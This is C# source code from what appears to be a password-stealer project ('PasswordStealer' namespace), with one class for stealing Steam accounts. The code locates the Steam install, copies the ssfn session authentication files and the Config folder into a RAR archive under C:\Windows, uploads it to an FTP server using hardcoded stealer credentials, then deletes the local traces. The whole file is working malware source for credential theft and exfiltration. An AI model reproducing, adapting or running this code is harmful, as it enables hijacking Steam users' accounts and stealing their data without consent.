using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using PasswordStealer;
using Microsoft.Win32;
using System.Security.Principal;
using System.IO.Compression;
using System.Diagnostics;

namespace Anime
{
    class SteamFiles
    {
        public static void GetSteamData()
        {
                    string SteamPath = null;
                    string TempPath = null;
                    string SteamPath_Reg = Registry.GetValue(@"HKEY_CURRENT_USER\SOFTWARE\Valve\Steam", "SteamPath", null).ToString().Replace("/", @"\");
                    string processName = "Steam.exe";
                    Process[] Checker = Process.GetProcessesByName(processName.Replace(".exe",""));
                    if (Checker.Length != 0)
                    {
                        string query = "Select * from Win32_Process Where Name = \"" + processName + "\"";
                        ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
                        ManagementObjectCollection processes = searcher.Get();
                        foreach (ManagementObject proc in processes)
                        {
                            string fullpath = proc["ExecutablePath"].ToString();
                            SteamPath = Path.GetDirectoryName(fullpath);
                        }
                    }
                    else
                    {
                        
                    }
                    string[] paths = {SteamPath_Reg,SteamPath};
                    for (int p = 0; p < paths.Length; p++)
                    {
                        if (TempPath != paths[p] && paths[p] != "")
                        {
                            string[] ssfn = Directory.GetFiles(paths[p], "ssfn*", SearchOption.AllDirectories).ToArray();
                            if (ssfn != null)
                            {
                                string[] ssfn_path = { ssfn[ssfn.Length - 1].ToString(), ssfn[ssfn.Length - 2].ToString() };
                                string[] ssfn_files = { ssfn_path[0].Split(Path.DirectorySeparatorChar).Last(), ssfn_path[1].Split(Path.DirectorySeparatorChar).Last() };
                                //
                                string ZIPPackage = "C:\\Windows\\BackupFiles.rar";
                                string folderToZip = paths[p] + "\\Config";
                                if (!File.Exists(folderToZip + "\\" + ssfn_files[0]) && !File.Exists(folderToZip + "\\" + ssfn_files[1]))
                                {
                                    File.Copy(ssfn_path[0], folderToZip + "\\" + ssfn_files[0]);
                                    File.Copy(ssfn_path[1], folderToZip + "\\" + ssfn_files[1]);
                                }
                                ZipFile.ZipFilses(ZIPPackage, folderToZip);
                                if (File.Exists(folderToZip + "\\" + ssfn_files[0]) && File.Exists(folderToZip + "\\" + ssfn_files[1]))
                                {
                                    File.Delete(folderToZip + "\\" + ssfn_files[0]);
                                    File.Delete(folderToZip + "\\" + ssfn_files[1]);
                                }
                                //
                                using (WebClient webClient = new WebClient())
                                {
                                    webClient.Credentials = (ICredentials)new NetworkCredential(PasswordStealer.Program.FTPLogin, PasswordStealer.Program.FTPPassword);
                                    webClient.UploadFile(PasswordStealer.Program.SteamData_path + "ssfn.rar", "STOR", ZIPPackage);
                                    File.Delete(ZIPPackage);
                                }
                                TempPath = paths[p];
                            }
                        }
                    }
            }
    }
}
